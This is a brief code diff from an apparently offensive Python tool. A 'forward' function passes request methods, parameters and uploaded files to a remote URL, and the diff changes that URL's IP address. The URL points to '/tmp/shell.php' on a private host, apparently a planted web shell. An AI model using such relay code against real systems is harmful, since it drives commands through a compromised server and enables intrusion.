@@ -249,7 +249,7 @@ def forward(requests):
     method = req['method']
     data = req['post']
     params = req['get']
-    url = "http://10.162.235.192/tmp/shell.php"
+    url = "http://10.164.151.178/tmp/shell.php"
     tmpfiles = req['file']
 
     files = []
